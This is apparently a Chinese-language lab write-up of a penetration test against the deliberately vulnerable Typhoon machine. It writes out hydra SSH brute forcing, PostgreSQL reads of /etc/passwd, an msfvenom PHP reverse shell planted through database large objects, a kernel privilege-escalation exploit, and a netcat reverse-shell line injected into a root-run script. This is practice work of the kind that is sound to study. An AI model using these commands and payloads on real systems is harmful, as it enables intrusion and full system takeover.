> 原文链接: https://www.anquanke.com//post/id/168877 


# Typhoon靶机渗透测试


                                阅读量   
                                **533782**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">14</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01ac44f6932acd0c2f.jpg)](https://p5.ssl.qhimg.com/t01ac44f6932acd0c2f.jpg)



## 前言

Typhoon这台靶机有比较多的漏洞，最多的就是由于配置不当导致漏洞。



## 靶机下载及配置

Typhoon靶机下载地址:[https://pan.baidu.com/s/18U0xwa9ukhYD4XyXJ98SlQ ](https://pan.baidu.com/s/18U0xwa9ukhYD4XyXJ98SlQ) 提取码: jbn9

Typhoon靶机ip: 192.168.56.150

kali攻击者ip: 192.168.56.1



## 知识点

nmap<br>
dirb<br>
hydra<br>
msfvenom<br>
内核权限提升<br>
Tomcat manger<br>
Durpal cms<br>
Lotus cms<br>
Mongodb<br>
postgresql未经授权访问<br>
redis未经授权访问<br>
……



## 开始测试

第一步还是开始进行目标靶机网络端口信息收集

`nmap -sV -p- -A 192.168.56.150`

[![](https://p3.ssl.qhimg.com/t01121985f5f7c10fb0.jpg)](https://p3.ssl.qhimg.com/t01121985f5f7c10fb0.jpg)

[![](https://p1.ssl.qhimg.com/t01c00535634a236eb1.jpg)](https://p1.ssl.qhimg.com/t01c00535634a236eb1.jpg)

[![](https://p5.ssl.qhimg.com/t014209fb80789c9410.jpg)](https://p5.ssl.qhimg.com/t014209fb80789c9410.jpg)

[![](https://p0.ssl.qhimg.com/t01b0067998fb47c89d.jpg)](https://p0.ssl.qhimg.com/t01b0067998fb47c89d.jpg)

扫描之后发现目标开放了很多的端口比如 21(ftp),22(ssh),25(smtp),53(dns),80(http),…2049(nfs-acl),3306(mysql),5432(postgresql),6379(redis),8080(http),27017(mongodb)等。

竟然发现开放了这么多端口，首先就得一个一个端口去测试(测试一部分)。

### <a class="reference-link" name="21%E7%AB%AF%E5%8F%A3(ftp)"></a>21端口(ftp)

nmap扫描结果为可以匿名访问

在浏览器访问，发现什么都没有

[![](https://p5.ssl.qhimg.com/t01310cf1efdac66dc6.png)](https://p5.ssl.qhimg.com/t01310cf1efdac66dc6.png)

### <a class="reference-link" name="22%E7%AB%AF%E5%8F%A3(ssh)"></a>22端口(ssh)

首先开始是想什么呢，ssh连接需要账号密码的，发现靶机名字为typhoon就想着去测试一下看看账号存不存在,利用ssh用户枚举漏洞进行测试

[![](https://p5.ssl.qhimg.com/t01924ee78b5da45478.jpg)](https://p5.ssl.qhimg.com/t01924ee78b5da45478.jpg)

结果用户存在，于是去想着爆破一下密码，看看是否为弱密码。

使用工具hydra

`hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.56.150`

[![](https://p4.ssl.qhimg.com/t0115b37b1b252c191d.jpg)](https://p4.ssl.qhimg.com/t0115b37b1b252c191d.jpg)

得到账号密码

username: typhoon<br>
password: 789456123

登录测试

[![](https://p0.ssl.qhimg.com/t01602f9bf094bf136e.jpg)](https://p0.ssl.qhimg.com/t01602f9bf094bf136e.jpg)

### <a class="reference-link" name="25%E7%AB%AF%E5%8F%A3(smtp)"></a>25端口(smtp)

在测试时没有测试成功

`nc 192.168.56.150 25`

[![](https://p0.ssl.qhimg.com/t01f4d8df4b40215029.jpg)](https://p0.ssl.qhimg.com/t01f4d8df4b40215029.jpg)

### <a class="reference-link" name="111%E7%AB%AF%E5%8F%A3(nfs,rpcbind)"></a>111端口(nfs,rpcbind)

[![](https://p4.ssl.qhimg.com/t01e97ec9c4afed2dfd.jpg)](https://p4.ssl.qhimg.com/t01e97ec9c4afed2dfd.jpg)

### <a class="reference-link" name="5432%E7%AB%AF%E5%8F%A3(postgresql)"></a>5432端口(postgresql)

第一步msf模块测试一下

use auxiliary/scanner/postgres/postgres_login<br>
set rhosts 192.168.56.150<br>
exploit

[![](https://p0.ssl.qhimg.com/t01b63423248b305c84.jpg)](https://p0.ssl.qhimg.com/t01b63423248b305c84.jpg)

发现账号密码<br>
username: postgres<br>
password: postgres

登录数据库<br>`psql -h 192.168.56.150 -U postgres`

列下目录<br>`select pg_ls_dir('./');`

[![](https://p5.ssl.qhimg.com/t01424d13efad332b41.jpg)](https://p5.ssl.qhimg.com/t01424d13efad332b41.jpg)

读取权限允许的文件

`select pg_read_file('postgresql.conf',0,1000);`

建表,并使用copy从文件写入数据到表

`DROP TABLE if EXISTS MrLee;`<br>`CREATE TABLE MrLee(t TEXT);`<br>`COPY MrLee FROM '/etc/passwd';`<br>`SELECT * FROM MrLee limit 1 offset 0;`

成功读取到了/etc/passwd第一行

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f2709d72d2961cc1.jpg)

直接读出全部数据

`SELECT * FROM MrLee;`

[![](https://p3.ssl.qhimg.com/t019a12dfedc9657fe6.jpg)](https://p3.ssl.qhimg.com/t019a12dfedc9657fe6.jpg)

[![](https://p3.ssl.qhimg.com/t01e4f320a79661d4c4.jpg)](https://p3.ssl.qhimg.com/t01e4f320a79661d4c4.jpg)

利用数据库写文件

`INSERT INTO MrLee(t) VALUES ('hello,MrLee');`<br>`COPY MrLee(t) TO '/tmp/MrLee';`

[![](https://p1.ssl.qhimg.com/t01acaf318fffcf48a3.jpg)](https://p1.ssl.qhimg.com/t01acaf318fffcf48a3.jpg)

`SELECT * FROM MrLee;`<br>
会显示里面有一句hello,MrLee<br>
如上可见,文件可以成功写入,并成功读取到源内容。

接下来就可以利用 “大对象” 数据写入法

`SELECT lo_create(6666);`<br>`delete from pg_largeobject where loid=6666;`<br>`//创建OID，清空内容`

[![](https://p5.ssl.qhimg.com/t015665f466098f61e5.jpg)](https://p5.ssl.qhimg.com/t015665f466098f61e5.jpg)

接下来向”大对象”数据写入数据(木马)，使用hex:

在写数据之前，先生成一个木马

`msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=6666 R &gt; /Desktop/shell.php`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d50ec7512e44c8b9.jpg)

打开这个shell.php复制转换成16进制

[![](https://p5.ssl.qhimg.com/t0115d253e0a63ba6d3.png)](https://p5.ssl.qhimg.com/t0115d253e0a63ba6d3.png)

`insert into pg_largeobject (loid,pageno,data) values(6666, 0, decode('.....', 'hex'));`

[![](https://p1.ssl.qhimg.com/t01ff5fd5237966c735.jpg)](https://p1.ssl.qhimg.com/t01ff5fd5237966c735.jpg)

导出数据到指定文件:

`SELECT lo_export(6666, '/var/www/html/shell.php');`<br>`//默认导出到安装根目录 也可以带路径自由目录写shell`

[![](https://p0.ssl.qhimg.com/t01a085c5acefaeb2ff.jpg)](https://p0.ssl.qhimg.com/t01a085c5acefaeb2ff.jpg)

接下来就是访问了(先msf开启监听，然后[http://192.168.56.150/shell.php](http://192.168.56.150/shell.php))

[![](https://p3.ssl.qhimg.com/t01e520eb86b1faf0ab.png)](https://p3.ssl.qhimg.com/t01e520eb86b1faf0ab.png)

### <a class="reference-link" name="6379%E7%AB%AF%E5%8F%A3(redis)"></a>6379端口(redis)

Redis未经授权访问漏洞利用，连接redis

[![](https://p2.ssl.qhimg.com/t0150bb65f8d71c947e.jpg)](https://p2.ssl.qhimg.com/t0150bb65f8d71c947e.jpg)

这个漏洞有三种方法利用<br>
1.利用redis写webshell<br>
2.利用”公私钥”认证获取root权限<br>
3.利用crontab反弹shell<br>
这三种方法都能可以，但就是利用不了，在这个点我弄了很多遍，决定放弃但在最后发现我写的文件都存在靶机里，原因是那些文件都没有更高的执行权限，所以导致都导致利用不了。

[参考链接](https://www.cnblogs.com/bmjoker/p/9548962.html)

### <a class="reference-link" name="%E5%85%B6%E4%BB%96%E7%AB%AF%E5%8F%A3"></a>其他端口

未完待续

### <a class="reference-link" name="80%E7%AB%AF%E5%8F%A3(http)"></a>80端口(http)

访问80端口[http://192.168.56.150](http://192.168.56.150)

[![](https://p2.ssl.qhimg.com/t0184415527643456cd.png)](https://p2.ssl.qhimg.com/t0184415527643456cd.png)

在nmap扫描发现80端口有个/monoadmin/目录，访问[http://192.168.56.150/monoadmin](http://192.168.56.150/monoadmin)

[![](https://p3.ssl.qhimg.com/t01f81283c6973df33e.png)](https://p3.ssl.qhimg.com/t01f81283c6973df33e.png)

选择84mb,点击change database,打开之后出现下面界面

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d5abf8839dc21af0.png)

然后下面有两个链接点击creds,会发现一个账号密码，跟ssh爆破一样的。

[![](https://p1.ssl.qhimg.com/t01e162f4af7825bc72.png)](https://p1.ssl.qhimg.com/t01e162f4af7825bc72.png)

username: typhoon<br>
password: 789456123

再次使用ssh连接

`ssh [typhoon@192.168.56](mailto:typhoon@192.168.56).150`

[![](https://p1.ssl.qhimg.com/t014125a41cf71982ad.jpg)](https://p1.ssl.qhimg.com/t014125a41cf71982ad.jpg)

竟然再次让我连接上了，这次我就不会这么轻易的放过它了，就想着看看能不能进行提权，于是查看了一下系统信息，不过连接的时候也告诉了系统的信息了

[![](https://p4.ssl.qhimg.com/t018f4b209c6ccccc80.jpg)](https://p4.ssl.qhimg.com/t018f4b209c6ccccc80.jpg)

发现目标为ubuntu 14.04,去[exploit-db](https://www.exploit-db.com)搜索这个内核漏洞,然后下载

poc地址:[https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)

[![](https://p3.ssl.qhimg.com/t01d856394e51b802e5.jpg)](https://p3.ssl.qhimg.com/t01d856394e51b802e5.jpg)

下载之后是一个.c文件，需要编译，把它上传到靶机编译运行

`scp /Downloads/37292.c  [typhoon@192.168.56](mailto:typhoon@192.168.56).150:/home/typhoon/`

[![](https://p1.ssl.qhimg.com/t0193af842c0cc46b62.jpg)](https://p1.ssl.qhimg.com/t0193af842c0cc46b62.jpg)

上传之后看一下成功了没,然后编译并运行

`ls`<br>`gcc 37292.c -o 37292`<br>`ls`<br>`./37292`

成功提权

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01dfa0ddab2860357b.jpg)

### <a class="reference-link" name="8080%E7%AB%AF%E5%8F%A3(Tomcat)"></a>8080端口(Tomcat)

浏览器访问 [http://192.168.56.150:8080](http://192.168.56.150:8080)

[![](https://p3.ssl.qhimg.com/t01f925cd6c2831a1fc.png)](https://p3.ssl.qhimg.com/t01f925cd6c2831a1fc.png)

发现需要登录

[![](https://p5.ssl.qhimg.com/t0175c2de8021010d94.png)](https://p5.ssl.qhimg.com/t0175c2de8021010d94.png)

于是想用msf测试存在账号密码

[![](https://p0.ssl.qhimg.com/t010752030af95abc4f.jpg)](https://p0.ssl.qhimg.com/t010752030af95abc4f.jpg)

[![](https://p2.ssl.qhimg.com/t0178b549c5bb86d763.jpg)](https://p2.ssl.qhimg.com/t0178b549c5bb86d763.jpg)

等到账号密码<br>
username: tomcat<br>
password: tomcat

利用mgr_upload漏洞

[![](https://p4.ssl.qhimg.com/t012c83f03783699fa0.jpg)](https://p4.ssl.qhimg.com/t012c83f03783699fa0.jpg)

`python -c 'import pty;pty.spawn("/bin/bash")'`进行交互

最后再tab文件里发现一个.sh文件具有高的执行权限，就想着往里面写代码进行再次提权.

[![](https://p1.ssl.qhimg.com/t013f654a7b802db79a.png)](https://p1.ssl.qhimg.com/t013f654a7b802db79a.png)

这时需要msfvenom创建bash代码

`msfvenom -p cmd/unix/reverse_netcat lhost=192.168.56.1 lport=5555 R`

[![](https://p3.ssl.qhimg.com/t014ee8f439aaeb72a4.png)](https://p3.ssl.qhimg.com/t014ee8f439aaeb72a4.png)

将生成的恶意代码添加到script.sh文件中

`echo "mkfifo /tmp/qadshdh; nc 192.168.56.1 5555 0&lt;/tmp/qadshdh | /bin/sh &gt;/tmp/qadshdh 2&gt;&amp;1; rm /tmp/qadshdh" &gt; script.sh`

运行./script.sh之前开启监听

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0157c4763e0fecf6d7.jpg)

开启监听端口

`nc -lvp 5555`

[![](https://p0.ssl.qhimg.com/t017f3fca4a940cd44a.jpg)](https://p0.ssl.qhimg.com/t017f3fca4a940cd44a.jpg)

### <a class="reference-link" name="dirb%20%E6%89%AB%E6%8F%8F"></a>dirb 扫描

在dirb扫描中有cms,durpal,phpmyadmin等

[![](https://p4.ssl.qhimg.com/t01a4e5fb78f5de3563.jpg)](https://p4.ssl.qhimg.com/t01a4e5fb78f5de3563.jpg)

### <a class="reference-link" name="Lotus%20CMS"></a>Lotus CMS

访问cms:[http://192.168.56.150/cms](http://192.168.56.150/cms)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01079dab2fc55c78e0.png)

[![](https://p4.ssl.qhimg.com/t01799fb1d118ad2342.png)](https://p4.ssl.qhimg.com/t01799fb1d118ad2342.png)

利用msf的lotus cms模块

[![](https://p5.ssl.qhimg.com/t0184bb412ebfa0ec62.jpg)](https://p5.ssl.qhimg.com/t0184bb412ebfa0ec62.jpg)

[![](https://p0.ssl.qhimg.com/t0196b54ca25a577e03.jpg)](https://p0.ssl.qhimg.com/t0196b54ca25a577e03.jpg)

### <a class="reference-link" name="Drupal%20CMS"></a>Drupal CMS

访问drupal: [http://192.168.56.150/drupal](http://192.168.56.150/drupal)

[![](https://p3.ssl.qhimg.com/t0140bb33eba0faa83b.png)](https://p3.ssl.qhimg.com/t0140bb33eba0faa83b.png)

再次使用msf的durpal cms模块

[![](https://p5.ssl.qhimg.com/t01000baeba088928ce.jpg)](https://p5.ssl.qhimg.com/t01000baeba088928ce.jpg)

### <a class="reference-link" name="others"></a>others

在dvwa文件的config配置文件中发现了phpmyadmin数据库的账号密码了

[![](https://p4.ssl.qhimg.com/t016e5d20f422cb187a.jpg)](https://p4.ssl.qhimg.com/t016e5d20f422cb187a.jpg)

username: root<br>
password: toor

访问登录:[http://192.168.56.150/phpmyadmin](http://192.168.56.150/phpmyadmin)

[![](https://p1.ssl.qhimg.com/t01ec61d1c9a60cc6fb.png)](https://p1.ssl.qhimg.com/t01ec61d1c9a60cc6fb.png)

进去之后发现得到一些账号密码，结果发现是在靶机了搭建了两个web测试平台

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018306c442757bd0a7.png)

[![](https://p3.ssl.qhimg.com/t01ba896cf6a6e89353.png)](https://p3.ssl.qhimg.com/t01ba896cf6a6e89353.png)



## 总结

本次靶机主要是端口渗透，类似于metasploitable2靶机,漏洞产生原因是由于配置不当。又学到了一些思路，哈哈哈。继续努力
